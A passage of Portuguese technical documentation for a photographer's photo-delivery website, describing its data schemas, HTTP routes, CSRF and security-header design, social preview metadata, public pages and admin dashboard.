| `drive_clicks:<slug>` | String numérica (contador de cliques no botão "Ir para o Drive") | `handleTrackDrive` |
| `removal_requests` | JSON: array com até 500 solicitações de remoção (rotação FIFO de resolvidas) | `handleRemovalRequest`, `handleResolveRequest` |
| `categories` | JSON: array de nomes de categorias gerenciáveis | `handleCreateCategory`, `handleDeleteCategory` |
| `ratelimit:<key>:<ip>:<window>` | String numérica, TTL = janela | `checkRateLimit` (todas as rotas com rate limit) |

> O log de consentimento **não** fica no KV — vive no D1 (`image_use_consent`, ver abaixo).

### Schema de um evento

```js
{
  id: "16 bytes hex",            // generateId()
  slug: "meu-evento-2025",       // [a-z0-9-], 1..60, validado por validateSlug
  title: "string ≤ 200",
  longDescription: "string ≤ 5000",
  photos: ["url1", "url2", ...],  // até 6, cada uma string ≤ 2000, https-only depois do toHttps()
  thumbnailUrl: "url1",           // sempre = photos[0] || legado
  driveUrl: "https://drive.google.com/drive/folders/...", // string ≤ 2000
  driveUrlInstagram: "https://drive.google.com/drive/folders/...", // opcional — pasta já redimensionada p/ Instagram — string ≤ 2000
  date: "YYYY-MM-DD",             // ou "" — validado contra regex
  eventCredits: "string ≤ 200",   // exibido como "Em colaboração com: <valor>" (instituição, fotógrafo colaborador ou projeto)
  projectUrl: "string ≤ 2000",
  visible: true,                  // se false, some da galeria pública
  comingSoon: false,              // se true, esconde fotos e troca botão por "As fotos virão em breve"
  status: "em-edicao" | "em-revisao" | "entregue" | "arquivado",
  accessType: "public" | "private" | "family", // declaração extra exigida no gate do Drive para private/family
  category: "string",             // alimenta os filtros da galeria e do dashboard; lista gerenciável em Config
  internalNotes: "string ≤ 5000", // só visível no dashboard
  pinned: false,                  // se true, vira card destacado (max 1 por vez — auto-desafixa outros)
  photosAlert: {
    active: false,
    addedAt: ISO date string | null,
    expiresAfterHours: 24
  },
  createdAt: ISO date string,
  updatedAt: ISO date string      // só presente após primeiro update
}
```

### Schema de uma solicitação de remoção

```js
{
  id: "16 bytes hex",
  eventSlug: "string",
  eventTitle: "string",           // snapshot do título na hora da request
  method: "number" | "url" | "upload",
  value: "Foto nº 12" | "https://..." | null,
  email: "string",
  phone: "string",
  message: "string ≤ 1000",
  fileName: "string" | null,      // só para method = "upload"
  fileBase64: null,               // apagado antes de persistir no KV (vai só no e-mail)
  resolved: false,
  createdAt: ISO,
  resolvedAt: ISO | undefined,
  emailStatus: "sent" | "skipped..." | "error: ...",
  confirmEmailStatus: "sent" | null | "error: ...",
  resolvedEmailStatus: "sent" | null | "error: ..."
}
```

Quando `removal_requests` passa de 500 itens, mantém **todos** os não-resolvidos e descarta os resolvidos mais antigos (FIFO).

### Tabela D1 `image_use_consent`

Banco `CONSENT_DB` (D1/SQLite). Uma linha **append-only** por acesso ao Drive (aceite dos Termos / autorização de uso de imagem):

```
id, created_at, event_slug, event_title, drive_target, access_type, terms_version,
terms_hash (SHA-256 do texto exato dos Termos), consent_text, declaration_text, consenter_name,
turnstile_ok, ip, country, region, city, timezone, asn, as_org, colo,
user_agent, accept_language, referrer, page_url
```

Coletado server-side em `handleDriveLink` (`POST /api/drive-link`) a partir de `request.headers` + `request.cf` — sempre com os textos canônicos do servidor (`TERMS_VERSION`/`CONSENT_LABEL`/declaração), nunca o que o client mandar. Exportável em CSV por `GET /api/consent/export` (auth). Retenção de ~5 anos via cron diário (`pruneOldConsent`).

---

## Rotas HTTP

Roteador único em `src/index.js`, baseado em cadeia de `if`s. Ordem importa — a regex `/^\/([a-z0-9][a-z0-9-]*)$/` que casa páginas de evento é **a última**, para não capturar `/dashboard`, `/suporte`, etc.

### `HEAD` — antes de qualquer roteamento

Toda rota da tabela abaixo casa com `method === 'GET'`. Um `HEAD` atravessaria a
cadeia inteira sem casar com nada e cairia no 404 — `GET /` respondendo 200 e
`HEAD /` respondendo 404 na **mesma URL**.

Isso não é detalhe de especificação. Monitor de uptime, verificador de link e
parte dos crawlers pedem `HEAD` exatamente para não baixar o corpo; para todos
eles o site inteiro estaria fora do ar. Foi assim que o smoke test do deploy
falhou pela primeira vez — ele lê cabeçalhos com `curl -sI`, recebeu a página de
erro e acusou a CSP, quando a causa era o método.

Por isso o `HEAD` é resolvido **antes** do roteador: a requisição é refeita como
`GET`, passa pelo roteamento normal, e só o corpo é descartado. Custa a mesma
leitura de KV que um `GET`, o que é o certo — a promessa do `HEAD` é que os
cabeçalhos sejam os do `GET`, e cabeçalho montado sem passar pelo handler mente
sobre status e tipo. Paridade coberta por teste e pelo smoke test do deploy.

### Portão de CSRF — antes do roteamento

A **primeira** coisa que roda, antes de qualquer `if (path === …)`: todo método
que não seja GET/HEAD passa por `isCrossSiteRequest()` e leva 403 se vier de
fora da origem.

A posição **é** o controle. Espalhado pelos handlers, ele viraria um item que
cada rota nova precisa lembrar de chamar — e o esquecimento não quebra nada, só
deixa a rota desprotegida em silêncio. Um teste de estrutura na CI garante que
ele continua antes do roteamento.

Por que não bastava o `SameSite=Strict` do cookie:

1. **`SameSite` é escopo de *site*, não de origem.** Qualquer coisa capaz de
   servir conteúdo em outro host de `lucafchala.com` é "same-site" e recebe o
   cookie normalmente. Por isso a checagem recusa também `Sec-Fetch-Site: same-site`.
2. **`SameSite` protege o cookie, não os endpoints sem cookie nenhum** —
   `/api/removal-request`, `/api/suporte`, `/api/drive-link` — que um site
   terceiro poderia acionar em nome de um visitante.

Ausência de sinal (nem `Sec-Fetch-Site` nem `Origin`) passa de propósito: quem
não manda nenhum dos dois não é browser, e um não-browser não sofre CSRF — ele
já controla a própria requisição. Bloquear por ausência custaria
compatibilidade sem comprar segurança.

### Públicas

| Método | Path | Função | O que faz |
| --- | --- | --- | --- |
| GET | `/` | `handleGallery` | HTML da galeria com cards de todos os eventos `visible !== false`, ordenados por pinned + data desc |
| GET | `/<slug>` | `handleEventPage` | HTML do projeto (página de entrega). Incrementa `views:<slug>` em `ctx.waitUntil`. O link do Drive **não** é embutido nesse HTML — só chega ao cliente via `/api/drive-link`, depois do gate |
| GET | `/suporte` | `supportHTML()` | Página de contato com WhatsApp + e-mail + formulário |
| GET | `/privacidade` | `privacyHTML()` | Política de Privacidade (LGPD) |
| GET | `/termos` | `termsHTML()` | Termos de Uso + autorização de uso de imagem |
| GET | `/legal`, `/compliance` | `legalHTML` | **Central de Transparência** — hub que reúne privacidade, termos, política de segurança, o resumo do que é feito com cada dado, a documentação de conformidade (`docs/legal/`) e os endpoints legíveis por máquina. Existe para que o rodapé precise de **um** link jurídico em vez de dois, sem esconder nada — a página mostra mais do que os dois links soltos mostravam. Estática, sem script |
| GET | `/legal/<slug>` | `docHTML` | Página própria de cada documento de conformidade, renderizada do markdown de `docs/legal/` (e do `SECURITY.md`). Slug desconhecido → 404, nunca uma página vazia. Estática, sem script. Ver [Páginas dos documentos legais](#páginas-dos-documentos-legais) |
| GET | `/sobre` | `aboutHTML()` | Bio curta, como funciona o trabalho, contato |
| GET | `/equipamentos` | `gearHTML()` | Lista de equipamento fotográfico |
| GET | `/manifest.json` | `handleManifest` | Manifest PWA |
| GET | `/icon.svg` | `handleIcon` | Ícone SVG inline (rect 256x256 com "f." centralizado) |
| POST | `/api/removal-request` | `handleRemovalRequest` | Recebe solicitação de remoção (rate-limit: 5/h por IP), envia e-mails, persiste |
| POST | `/api/track-drive` | `handleTrackDrive` | Incrementa `drive_clicks:<slug>` (rate-limit: 60/h por IP) |
| POST | `/api/drive-link` | `handleDriveLink` | **O único lugar que devolve o link real do Drive.** Valida o Turnstile no servidor (fail-closed, 403 se falhar), o slug, o aceite dos Termos (+ declaração quando exigida), rate-limit 60/h por IP (10/h no caminho `noscript` p/ ad-blocker) — e grava o aceite em D1 (best-effort, no-op sem D1) |
| POST | `/api/perf` | `handlePerfBeacon` | Beacon de performance (Web Vitals) enviado por `navigator.sendBeacon`, amostrado a 10% no cliente. Responde sempre `204` sem corpo, inclusive para payload inválido — é fire-and-forget e nunca pode 500. **Não escreve em KV** (a cota de escrita é reservada para eventos/sessões/consentimento): o destino é log estruturado e, se o binding `PERF` existir, um dataset do Analytics Engine. Sem rate-limit por KV (custaria mais que o beacon economiza); um beacon com `Origin` de outro site é descartado |
| POST | `/api/csp-report` | `handleCspReport` | Coletor das violações da CSP estrita (que roda em Report-Only). Serve a dois fins: medir quantos handlers inline faltam para a virada da política, e detectar tentativa de XSS — um relatório apontando para script que ninguém colocou ali chega antes de qualquer reclamação. **Não escreve em KV** (mesma razão do `/api/perf`): vai para log estruturado. Amostrado a 20% e limitado a 8 KB no servidor, porque quem chama este endpoint não somos nós |
| POST | `/api/suporte` | `handleSupportRequest` | Envia e-mail do formulário de suporte (rate-limit: 5/h por IP) |
| GET | `/api/healthz` | `handleHealthz` | `{ok, kv, events, d1, …}` (+ `kvLatencyMs`, `cron`, `config`, …; 2 leituras de KV) — usado pelo CI e pelo dashboard de status |

### Autenticadas (cookie `__Host-session` válido)

| Método | Path | Função |
| --- | --- | --- |
| GET | `/dashboard` | Painel ou tela de login/setup |
| POST | `/dashboard/login` | Recebe form, valida ou cria senha, cria sessão |
| POST | `/dashboard/logout` | Deleta sessão no KV + cookie expirado |
| POST | `/api/events` | Criar evento |
| PUT | `/api/events/<id>` | Atualizar evento (parcial; só campos enviados) |
| DELETE | `/api/events/<id>` | Excluir evento e deletar `views:<slug>` |
| POST | `/api/events/bulk-category` | Aplica uma categoria a vários eventos de uma vez (`{ids, category}`) — dashboard exige confirmação digitada antes de chamar |
| POST | `/api/events/bulk-access` | Aplica um `accessType` a vários eventos de uma vez (`{ids, accessType}`) — mesma confirmação digitada |
| GET | `/api/metrics` | Lista [{slug, title, views, driveClicks}] ordenada por views desc |
| GET | `/api/consent/export` | CSV do log de consentimento (D1); 503 se o D1 não estiver provisionado |
| PUT | `/api/settings/password` | Trocar senha do admin |
| GET | `/api/backup` | Download JSON **v2** (eventos + categorias + solicitações) |
| POST | `/api/backup/restore` | Merge de backup (v1 ou v2) com o KV atual (por id, mais recente vence) |
| GET | `/api/removal-requests` | Lista solicitações ordenadas por data desc |
| PUT | `/api/removal-requests/<id>/resolve` | Marca resolvida e envia e-mail "Solicitação atendida" ao requerente |

### Erros

- `notFound()` retorna 404 com um HTML mínimo escuro tipo "404 / Página não encontrada / ← Voltar para a galeria".
- Qualquer exceção não tratada cai no `catch` do `fetch` e retorna 500 `"Erro interno."`.
- Helpers: `jsonOk(data, status=200)`, `jsonErr(message, status=400)`, `redirect(location)`.

### Headers de segurança

Toda a política vive em **`src/security.js`**, num lugar só. O motivo é o modo de
falha desses controles: eles não quebram quando estão errados, só param de
proteger em silêncio — um cabeçalho esquecido numa rota nova, duas respostas com
CSP diferente, o `no-store` que ficou de fora justamente do endpoint que devolve
o export de consentimentos.

Há três perfis, e cada rota só escolhe qual deles se aplica:

| Perfil | Onde | O que tem a mais |
| --- | --- | --- |
| `htmlSecurityHeaders()` | Páginas públicas | CSP com nonce, COOP/CORP, `Reporting-Endpoints` |
| `adminHtmlSecurityHeaders()` | `/dashboard`, login | `no-store`, `X-Robots-Tag: noindex`, `Referrer-Policy: no-referrer` |
| `dataSecurityHeaders()` | JSON, CSV, texto, imagem | `default-src 'none'; sandbox`, `no-store` (salvo opt-in explícito) |

Baseline presente em **qualquer** resposta, inclusive 404 e 500 — uma página de
erro sem `nosniff` continua sendo conteúdo servido pela nossa origem:

```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=63072000; includeSubDomains
Permissions-Policy: <lista longa de negações explícitas>
Origin-Agent-Cluster: ?1
X-Permitted-Cross-Domain-Policies: none
```

O `Permissions-Policy` é longo de propósito: uma lista curta ("camera, mic,
geolocation") só nega três coisas, e qualquer API nova do browser nasce liberada.

`upgrade-insecure-requests` continua na CSP: o browser converte qualquer
`http://` para `https://`, eliminando "mixed content" se um link antigo de foto
tem protocolo inseguro no KV. Em paralelo, `toHttps()` normaliza ao salvar e
`safeUrl()` sanitiza no ponto de uso.

**COEP fica de fora** deliberadamente: `require-corp` apagaria a galeria, já que
o `lh3.googleusercontent.com` não envia CORP. **HSTS sem `preload`**: é
compromisso de domínio inteiro, praticamente irreversível, e portanto decisão do
dono — não efeito colateral de um commit.

#### CSP: duas políticas ao mesmo tempo

Toda página HTML sai com `Content-Security-Policy` **e**
`Content-Security-Policy-Report-Only`, construídas pela mesma função para que não
possam divergir:

- A **enforced** tem `'unsafe-inline'` e **nenhum nonce**. Essa combinação é
  deliberada: pela CSP Level 3, **a presença de um nonce faz o browser descartar
  o `'unsafe-inline'`**. Ou seja, `'self' 'unsafe-inline' 'nonce-abc'` não é "os
  dois" — é só o nonce, e todo `onclick="…"` para de executar. A UI tem uns 63
  deles; o resultado é galeria, página de evento, gate do Drive e painel mortos
  ao mesmo tempo. Isso chegou a ser commitado e só foi pego dirigindo um browser
  de verdade: um teste que afirma que a string da política contém
  `'unsafe-inline'` passa tranquilo enquanto o browser a ignora.
- A **report-only** é a política que queremos impor — `'nonce-…'` sem
  `'unsafe-inline'`. Em Report-Only, cada handler remanescente vira um relatório
  em `/api/csp-report` em vez de um elemento quebrado. É a lista de tarefas da
  migração, medida em produção e não chutada. Os `nonce="…"` na marcação existem
  para *essa* política.

A virada acontece quando os relatórios zerarem: tirar os handlers inline e então
deixar a enforced usar `strict` também. Até lá, um `<script>` sem nonce é
invisível hoje e quebra no dia da virada — por isso a CI recusa um, e o smoke
test do deploy recusa um nonce aparecendo no cabeçalho enforced.

---

## Páginas públicas

Todas as oito páginas públicas (`/`, `/<slug>`, `/sobre`, `/equipamentos`, `/termos`, `/privacidade`, `/suporte`, mais o listing raiz) compartilham um rodapé gerado por `footerLegalLinksHTML()` (`src/utils.js`): links Sobre/Equipamento/Suporte/Legal/Código-fonte + linha de copyright com o ano calculado em tempo de request (`© {ano} Luca F. Chala. Todos os direitos reservados.`, sempre correto, sem cron). A função não tem ponto de extensão: já teve um parâmetro `extra`, usado por um único chamador (o "Ver tour novamente" da página de projeto), e ele saiu junto com o tour — rodapé que varia por página é exatamente o que este bloco compartilhado existe para impedir. "Sugestões" propositalmente **não** entrou nesse rodapé (ficaria apertado); vive só no aviso de nova interface, abaixo. A galeria e a página de projeto também mostram, no topo, um **aviso dispensável de "nova interface"** (`updateBannerHTML()`, mesmo `src/utils.js`) com links "Reportar" e "Tem uma sugestão?" para `/suporte?tema=bug` e `/suporte?tema=sugestao` (pré-preenchem a mensagem do formulário); a dispensa é lembrada via `localStorage['fotos:update_banner_dismissed']`, por página (cada uma escuta o próprio botão de fechar). Todas as oito páginas também trazem, comentados no `<head>` (sem efeito nenhum até serem descomentados e preenchidos com um ID real), placeholders prontos pra Microsoft Clarity; a galeria ganha ainda um placeholder de verificação do Google Search Console.

Todas as páginas públicas respeitam **`prefers-color-scheme`** automaticamente — sem toggle manual (o experimental foi removido em fase anterior e não volta). Cada arquivo declara seu próprio conjunto de variáveis CSS (`:root{...}` + `@media(prefers-color-scheme:light){:root{...}}`), sem CSS compartilhado entre páginas — mesmo padrão de "cada página é seu próprio template literal" já usado no resto do projeto. Chrome sobreposto a uma foto (pill de voltar, setas/dots/contador do carrossel, badges do card) fica sempre escuro/translúcido nos dois temas, porque a função dele é contraste contra a foto, não contra a página. Os botões de CTA ("Acessar fotos", "Ir para o Drive", "Enviar mensagem") usam a cor de destaque dourada como fundo nos dois temas (`--cta-bg`/`--cta-text`) — mesma cor de marca em vez de inverter pra uma pílula preto/branco conforme o tema. O dashboard admin **não** foi incluído nesse trabalho — continua só escuro.

### `/` — Galeria (`src/ui/gallery.js`)

- Header com o logo `fotos · Luca F. Chala` (tema claro/escuro automático via `prefers-color-scheme`, sem toggle).
- Busca por título/URL/categoria + filtro de status + **filtro de categoria** (`<select>`), todos client-side sobre os eventos já carregados — sem requisição nova a cada busca/filtro. Busca e categoria ficam refletidas na URL (`?q=...&cat=...`, via `history.replaceState()`, sem reload) e a posição de rolagem + quantidade carregada ("Carregar mais") ficam em `sessionStorage['fotos:gallery_state']` — voltar da página de um evento (botão Voltar do navegador, ou o pill "todos os projetos", que também carrega o filtro) restaura tudo em vez de resetar a busca.
- Grid **estilo masonry** (CSS Grid com `grid-auto-rows` numa unidade fina + `layoutMasonry()` calculando quantas "linhas" cada card ocupa a partir da altura real do conteúdo), não mais um grid de proporção fixa: cada thumbnail segue a proporção real da foto, sem cortar fotos retrato numa caixa pensada para paisagem. Ao contrário de uma abordagem por `column-count` (que preenche coluna por coluna), o Grid preenche linha por linha na ordem do DOM, então a ordem de leitura continua previsível (item 2 sempre ao lado do item 1, não em qualquer coluna que a aritmética decidir). Recalcula no carregamento de cada imagem (inclusive as `loading="lazy"` fora da tela) e no resize, com `align-items:start` garantindo que a altura lida seja sempre a real, nunca uma esticada de um cálculo anterior. Os placeholders "em breve" (ícone/capa borrada) continuam com proporção fixa — não há foto real ali para respeitar.
- Cada card mostra: thumbnail (com shimmer loader animado enquanto carrega), data formatada em PT-BR ("12 de maio de 2025"), título (maior que antes) e tag de categoria — **sem descrição** (o campo `shortDescription` foi removido do modelo de dados).
- Eventos com `pinned: true` ocupam toda a largura (grid-column 1/-1, hero 16:9) e ganham badge "Em destaque".
- Eventos com `comingSoon: true` mostram badge "em breve" no canto, ícone de relógio no lugar do thumb.
- Eventos com `visible: false` são filtrados fora.
- Ordenação: pinned primeiro, depois por `date` desc (fallback `createdAt`).
- Footer com link para Instagram (@lucafchala) + o bloco de rodapé compartilhado descrito acima.

### `/<slug>` — Página de projeto (`src/ui/event.js`)

Arquivo grande (~40 KB) porque inclui HTML + CSS + JS inline. Componentes:

- **Banner de novas fotos** (se `photosAlert.active` e dentro da janela de expiração): "Novas fotos adicionadas — há X minutos/horas/dias", atualizado em JS a cada 60s.
- **Hero**: sem mais a barra "todos os projetos" acima da foto (antigo `<header>` removido) — um pill semitransparente com blur (`.back-pill`), sobreposto no canto superior esquerdo do hero, leva de volta para `/` (carregando o filtro da galeria de onde veio, se aplicável — ver seção da galeria), legível sobre qualquer foto. Se `comingSoon`, mostra placeholder com ícone de relógio + "Em breve". Se 0 fotos, ícone de câmera. Se 1 foto, hero único. Se ≥ 2, **carrossel** com botões anterior/próxima, dots, contador (1/N), e swipe touch (`touchstart`/`touchend` com threshold 40px). Tocar/clicar em qualquer foto de preview abre um **lightbox** em tela cheia (setas/swipe para navegar, double-tap ou duplo clique para zoom 2.2×, Escape/fundo/botão fecha) — é só visualização das fotos de prévia já embutidas na página, não tem download nem substitui o fluxo do Drive.
- **Conteúdo**: data, título grande, descrição longa opcional (`white-space: pre-wrap`, sem espaço morto quando ausente), botão "Acessar fotos" (pulso sutil de atenção se ficar ~11s sem clique).
- **Modal "Acessar fotos"** (gate real, verificado no servidor): termos + botão de acesso aparecem **juntos e imediatamente** ao abrir — o Turnstile já foi pré-carregado de forma invisível assim que a página abriu (`execution:'execute'`), então normalmente já está pronto; não há mais uma tela de "Carregando…" escondendo os termos. O botão fica visível mas com cor "desabilitada" até o link real chegar; o ícone vira um spinner assim que os termos/declaração são aceitos — não só durante a requisição, mas também no intervalo em que só falta o Turnstile liberar um token (`maybeFetchDriveLink()` acende o spinner nos dois casos). O botão continua clicável nesse intervalo (não trava por CSS); clicar antes de aceitar os termos faz a caixa de aceite piscar e mostra "você precisa aceitar os termos e declarações primeiro" por ~3,5s, e clicar depois de aceitar mas antes do link estar pronto mostra "só um instante, o acesso ainda está carregando" pelo mesmo período (mensagens só aparecem reagindo ao clique, nunca ficam fixas). Assim que Turnstile + Termos estão OK, o link real é buscado automaticamente em `POST /api/drive-link` (sem esperar clique extra); uma vez pronto, um pulso sutil chama atenção se ficar alguns segundos sem clique. Erro de verificação mostra mensagem compacta com opção de tentar de novo — a linha de contato de emergência ("fale comigo" / "me chame no WhatsApp") usa o mesmo tom vermelho-erro (`.dv-contact` casa com `.dv-msg`), em vez de destoar com uma cor separada. Se um bloqueador de anúncios impede o carregamento do Turnstile, exibe um aviso pedindo para desativá-lo / ativar o JavaScript — o acesso ainda é possível por um caminho mais fraco (sem captcha, rate-limit próprio mais restritivo, auditado como não-verificado), decisão consciente para não travar a entrega a esse público (ver seção LGPD e `SECURITY.md`). A caixa "Antes de acessar" mostra a dica de não tirar print, um aviso permanente para **não compartilhar o link do Drive diretamente** (usar o botão Compartilhar do rodapé, que manda a página do projeto com o mesmo controle de acesso), o botão de crédito do Instagram e (se definido) `eventCredits`; depois do botão, uma dica explica como baixar tudo de uma vez no Drive (selecionar tudo + "Fazer download"). O clique final chama `trackDrive()` antes de abrir o Drive em nova aba.
- **Créditos**: link com a logo real do Instagram levando para @lucafchala ("Marque-me"), (opcional) `eventCredits` como "Em colaboração com: <valor>" — cobre instituição, fotógrafo colaborador ou projeto parceiro, não só outro fotógrafo — e link extra do projeto. Nesta seção o Instagram entra como mais uma linha da lista de créditos (mesmo alinhamento/espaçamento, sem o cartão/pill isolado); no modal de acesso ("Antes de acessar") ele continua com o visual de botão de destaque, contexto onde faz sentido chamar mais atenção.
- **Footer**: duas camadas visuais — ações em destaque (Compartilhar/WhatsApp, Copiar link, "Solicitar remoção de foto", texto/contraste mais fortes, sem aparência de botão pill) e os links legais de baixo contraste (Sobre/Equipamento/Suporte/Legal/Código-fonte, via `footerLegalLinksHTML()`) + copyright, via o bloco de rodapé compartilhado.
- **Breadcrumbs**: `Início · <ano> · <título>` no topo do `<main>` (fora do hero, tematizado com as vars normais da página — diferente do `.back-pill`, que fica sempre escuro por sobrepor a foto). O link do ano aponta pra `/?year=<ano>`. Acompanhado de um `<script type="application/ld+json">` `BreadcrumbList` (Schema.org) no `<head>` pra rich results de busca. `year` vem de `event.date` (ou `createdAt`/`updatedAt` como fallback) calculado em `handleEventPage()`.
- **Modal de remoção**: formulário com:
  - Radio: identificar foto por número, link direto ou upload (até 2 MB).
  - E-mail (obrigatório, regex), telefone (obrigatório, 10–13 dígitos).
  - Mensagem opcional.
  - Aviso LGPD curto: "Seus dados (e-mail e telefone) são usados exclusivamente para processar esta solicitação."
  - **Turnstile** obrigatório; como o token é de uso único, o widget é **resetado automaticamente** após uma falha de envio (evita o loop de 403 ao tentar de novo com token gasto). A leitura do arquivo de upload é protegida (erro amigável em vez de falha silenciosa).
  - Submete via fetch para `/api/removal-request`. Sucesso troca o conteúdo da modal por uma tela verde com check.
  - **Bloqueador de anúncios / JS desativado**: se o script do Turnstile não carrega, a modal mostra um aviso (desative o bloqueador, ative o JavaScript, botão de recarregar) e mantém o envio desabilitado — a solicitação exige a verificação server-side.

### `/suporte` — Página de suporte (`src/ui/support.js`)

- Header com link "Voltar".
- Botões grandes: WhatsApp (`wa.me/5511989211178`) e e-mail (`mailto:suporte@lucafchala.com`).
- Divisor "ou envie uma mensagem".
- `?tema=` na URL pré-preenche a mensagem do formulário via `TEMA_PREFILLS` em `src/index.js` — `bug` (link "Reportar" do aviso de nova interface) e `sugestao` (link "Sugestões" do mesmo aviso e do rodapé). Cosmético; nunca confiado no servidor além do texto inicial.
- Formulário POST para `/api/suporte` (form-data, sem fetch — degrada para HTML puro). Campos: nome (opcional), e-mail (opcional, vira `reply_to` se preenchido), mensagem (obrigatório, ≤ 2000 chars). **Turnstile** obrigatório; o botão fica desabilitado até a verificação passar, com **fallback** que o reabilita se o script for bloqueado, mais guarda anti-duplo-envio.
- Após envio, a página é recarregada e mostra caixa verde "Mensagem enviada!". Em caso de erro, **nome/e-mail/mensagem são preservados** (re-renderizados escapados) para não perder o texto digitado.
- Erros (campos vazios, rate limit, Turnstile) mostram caixa vermelha. Se um ad-blocker bloqueia o Turnstile, aparece um aviso para desativá-lo / ativar o JS (ou usar WhatsApp/e-mail); um banner `<noscript>` cobre o caso de JavaScript totalmente desativado.

### `/sobre` e `/equipamentos` (`src/ui/about.js`, `src/ui/gear.js`)

Páginas estáticas simples, sem dados dinâmicos — mesmo esqueleto (header com link "Voltar", `<main>`, rodapé compartilhado). `/sobre` (bio curta + como funciona o trabalho + contato) já existia escrita mas ficava fora do ar de propósito enquanto o texto era revisado; está publicada agora. `/equipamentos` é nova: lista o equipamento fotográfico (câmeras, lentes, acessórios etc.) em seções `<h2>`/`<h3>` + listas. Ambas entram no `sitemap.xml` e no rodapé compartilhado.

---

## Cartão de pré-visualização do link (Open Graph)

É por WhatsApp que um link de projeto se espalha, e o que o destinatário vê
antes de tocar é o **cartão** — não a página. O cartão é montado só a partir do
`<head>`: nenhum script roda no scraper.

Um bloco só, `socialMetaHTML()` em `src/utils.js`, monta o conjunto para todas
as páginas públicas. Antes cada `<head>` tinha o seu, e eles divergiram: a
página de projeto não tinha nem `<meta name="description">`, `/privacidade`,
`/termos` e `/suporte` não tinham tag de Open Graph nenhuma, e nenhuma delas
declarava `og:site_name` ou o tamanho da imagem.

### O que cada tag resolve

| Tag | Para quê |
| --- | --- |
| `og:image:width` / `height` | Decide entre o **cartão grande** (foto no topo, ocupando a largura da bolha) e a miniatura quadrada ao lado do texto. Sem as dimensões declaradas o WhatsApp precisa baixar a imagem para medir, e quando o download é lento ou falha ele cai na miniatura |
| `og:site_name` / `og:locale` | Linha de origem do cartão e idioma |
| `twitter:*` | Twitter/X e Discord ignoram parte das `og:` e leem estas |
| `name="description"` | O mesmo texto serve ao resultado de busca — separados, um envelhece sem que o outro acuse |

`ogImageFor()` recorta a capa em **1200×630** pedindo `=w1200-h630-c` ao
`lh3.googleusercontent.com`. O recorte é o ponto: o scraper recortaria de
qualquer jeito, mas assim as dimensões são **conhecidas na hora de renderizar o
HTML** e podem ir declaradas. URL de outro host volta intacta e **sem**
dimensões — prometer 1200×630 de uma imagem de tamanho desconhecido é pior que
não prometer nada, e o cartão cai para `summary` de propósito. O PNG servido em
`/og-coming-soon.png` já tem exatamente essa medida, então o projeto "em breve"
segue o mesmo caminho.

### A descrição

Os **fatos primeiro**, o texto livre depois (`previewDescription()`). O WhatsApp
mostra cerca de duas linhas antes de cortar, então o que o destinatário procura
tem de vir antes da descrição do projeto — invertido, o que sobra na tela é o
começo de um parágrafo genérico.

Na página de projeto, na ordem: `Em breve` (se for o caso), a data, **`Em
colaboração com <eventCredits>`**, a categoria e `Acesso restrito` (para
`accessType` `private` ou `family`), e só então a descrição longa, cortada no
espaço para caber em 200 caracteres:

```
15 de janeiro de 2026 · Em colaboração com Colégio Santa Cruz · Formatura — Colação de grau, do café da manhã ao baile.
```

O crédito vem logo depois da data porque é a primeira informação que se procura
quando o projeto é de uma instituição — e porque o WhatsApp corta o resto. A
home resume o acervo em vez de repetir o título (`28 projetos · Formatura,
Casamento, Ensaio · 2019–2026`).

### JSON-LD

A página de projeto emite um array com dois nós: o `BreadcrumbList` que já
existia e um **`PhotoGallery`** com os mesmos fatos do cartão — `datePublished`,
`genre`, `author` e `creditText` com o colaborador. `creditText`, e não
`contributor`, porque o campo do painel aceita tanto instituição quanto
fotógrafo colaborador ou projeto: declarar `Organization` onde pode haver
`Person` seria afirmar o que não se sabe.

A suíte `tests/rendered-pages.test.js` renderiza cada página pública e parseia o
`<head>` que saiu — uma página que esqueça de chamar `socialMetaHTML()` volta a
ser um link sem cartão, e nada mais no projeto acusaria.

---

## Painel administrativo `/dashboard`

Renderizado por `src/ui/dashboard.js`. Mesma página tem login e dashboard:

### Login / setup

- Se KV não tem `admin_password`: tela de setup com campos "Nova senha" + "Confirmar senha". Mínimo 6 chars. Submete em POST para `/dashboard/login` com `setup=1`.
- Se já tem: tela com 1 campo de senha. Erro mostra aviso vermelho "Senha incorreta".
- POST `/dashboard/login` define cookie `session=<64 hex>; HttpOnly; Secure; SameSite=Strict; Max-Age=86400`.

### Dashboard

Layout fixo no topo + abas:

- **Topbar**: logo + links "Ver site" (abre `/` em nova aba) e "Sair" (POST logout).
- **Tabs**: `Eventos`, `Métricas`, `Config.`, `Solicitações` (badge vermelho com contador de não-resolvidas).

#### Aba Eventos

- Header: contador ("N eventos ativos") + botão "+ Adicionar".
- **Busca** (título / URL / categoria) + filtro de status `<select>` (`Todos / Ativos (sem arquivados) / Em edição / Em revisão / Entregue / Arquivado`) + **filtro de categoria** `<select>` — os três combinam, tudo client-side sobre os eventos já carregados.
- No formulário: `Esc` fecha, `Ctrl/⌘+Enter` salva, foco preso (focus trap) no overlay e rodapé de ações fixo (sticky). Fechar com alterações não salvas (Esc, clique fora ou "Cancelar") pede confirmação ("Descartar alterações?"); fechar após salvar com sucesso não pede. Fechar a aba/navegador com o formulário aberto e sujo dispara o aviso nativo do navegador (`beforeunload`).
- **Colar vários links**: botão ao lado de "Adicionar foto" abre uma caixa de texto — um link do Drive por linha — que popula a lista de fotos de uma vez (respeita o limite de 6).
- Lista de eventos (cards horizontais) com: thumb, título + badge de status colorida, slug em monospace, botões de ação à direita:
  - **Pin** (estrela) — toggle. Ao pinar, despina todos os outros (server-side garante max 1).
  - **Eye** — toggle `visible`.
  - **Edit** — abre overlay com formulário pré-preenchido.
  - **Duplicar** — abre o formulário de "novo evento" pré-preenchido com os dados do evento (drive links, categoria, tipo de acesso, créditos, fotos), título com sufixo " (cópia)", `slug` em branco (precisa ser único) e nunca marcado como fixado (evita despinar o original ao salvar).
  - **Delete** (lixeira vermelha) — pede confirmação **digitando o título exato do evento**, não só um clique em "Confirmar" (ver "Confirmações" abaixo).
- **Overlay/formulário de evento** com todos os campos: slug, título, descrição longa, fotos (até 6, com colagem em lote — ver acima — e pré-visualização miniatura inline; campo "blur" converte links de Drive para `lh3.googleusercontent.com`), link do Drive, link do Drive para Instagram, data, "Em colaboração com" (institição/fotógrafo colaborador/projeto), link extra, status, tipo de acesso, **categoria** (lista gerenciável — ver aba Config; alimenta os filtros da galeria e do dashboard), notas privadas, toggles "Visível" e "Em breve", e bloco "Aviso de novas fotos" (toggle + select de expiração: nunca / 1h / 6h / 24h / 48h / 168h).
